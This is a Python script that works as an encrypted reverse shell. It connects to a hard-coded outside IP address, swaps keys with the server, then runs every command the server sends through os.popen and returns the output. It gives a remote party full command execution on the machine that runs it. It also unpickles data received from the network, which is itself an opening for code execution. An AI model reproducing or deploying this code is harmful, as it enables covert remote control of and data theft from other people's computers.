# first of all import all the modules
import socket			 
import rsa
from cryptography.fernet import Fernet
import pickle
import hashlib
import os
#genorating key
global key
key = Fernet.generate_key()
f = Fernet(key)
#send encripted funcution
def send(s,msg):
    f=Fernet(key)
    msg=f.encrypt(str(msg).encode())
    s.send(msg)
def recv(s):
    msg=s.recv(2480)
    f=Fernet(key)
    msg=f.decrypt(msg).decode()
    return(msg)
#making login if one is not present
try:
    password  =open('login.dat','r').readlines(2)
    user=open('login.dat','r').readlines(1)
    print(user,password)
except:
    file_user=open('login.dat','w+')
    password=input('enter password').encode()
    password=hashlib.sha512(password).hexdigest()
    file_user.write(password)
    file_user.close()
    print('user created')
    file_user.close()

#seting up pickle file
pickle_off = open ("unpickle.txt", "w+").close()

#genorating key
key = Fernet.generate_key()
f = Fernet(key)
print(key)
#seting up tcp socket
HOST = '172.105.26.60'  # The server's hostname or IP address
PORT = 65432        # The port used by the server
s = socket.socket()

s.connect((HOST, PORT))

#recving the public key and saving it then closeing the file so it can be read
public=s.recv(40000)
print('recived')
pickle_off = open ("unpickle.txt", "wb")
pickle_off.write(public)

#unpicking the key
pickle_off = open ("unpickle.txt", "rb")
publickey = pickle.load(pickle_off)
#sending symetrick key encripted by the public key
crypto = rsa.encrypt(key, publickey)
s.send(crypto)
#recv welcome msg
try:
    welcome_msg=s.recv(2480)   
    print(f.decrypt(welcome_msg))
except:
    print('msg failed to be recved')
    exit()

os.chdir('C:/')
send(s,os.getcwd())
while 1:
    cmd=recv(s)
    if cmd=='chdir':
        os.chdir(recv(s))
    else:
        cmdoutput = os.popen(cmd).read()
        print(cmdoutput)
        send(s,cmdoutput)
